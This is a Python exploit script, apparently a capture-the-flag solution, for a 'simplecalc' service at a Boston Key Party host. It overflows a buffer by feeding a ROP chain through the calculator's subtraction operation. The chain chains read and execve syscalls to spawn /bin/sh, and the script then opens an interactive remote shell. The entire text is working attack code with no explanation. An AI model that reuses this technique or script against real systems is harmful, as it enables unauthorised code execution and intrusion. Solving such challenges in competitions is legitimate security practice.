#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'simplecalc.bostonkey.party','port':5400}
#target     = {'host':'192.168.75.129','port':8080}

addr_buffer         = 0x006c2c40
addr_pop_rax        = 0x0044db34
addr_pop_rdi        = 0x00401b73
addr_pop_rdx_rsi    = 0x00437aa9
addr_syscall        = 0x004648e5

syscall_read        = 0
syscall_execve      = 59

str_sh              = '/bin/sh\0'

#==========
def attack(cmn):
    cmn.read_until('calculations: ')
    cmn.sendln('255')
    
    exploit  = '\x00'*0x40
    exploit += pack_64(0xdeadbeef)

    exploit += pack_64(addr_pop_rdi)
    exploit += pack_64(STDIN_FILENO)
    exploit += pack_64(addr_pop_rdx_rsi)
    exploit += pack_64(len(str_sh))
    exploit += pack_64(addr_buffer)
    exploit += pack_64(addr_pop_rax)
    exploit += pack_64(syscall_read)
    exploit += pack_64(addr_syscall)
    
    exploit += pack_64(addr_pop_rdi)
    exploit += pack_64(addr_buffer)
    exploit += pack_64(addr_pop_rdx_rsi)
    exploit += pack_64(0)
    exploit += pack_64(0)
    exploit += pack_64(addr_pop_rax)
    exploit += pack_64(syscall_execve)
    exploit += pack_64(addr_syscall)

    put_data(cmn, exploit)
    
    cmn.read_until('=> ')
    cmn.sendln('5')
    cmn.send(str_sh)

def put_data(cmn, data):
    data = [unpack_32(data[i: i+4]) for i in range(0, len(data), 4)]
    for v in data:
        subs(cmn, v)

def subs(cmn, val):
    cmn.read_until('=> ')
    cmn.sendln('2')
    cmn.read_until('x: ')
    cmn.sendln(str(val+40))
    cmn.read_until('y: ')
    cmn.sendln('40')
    
#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
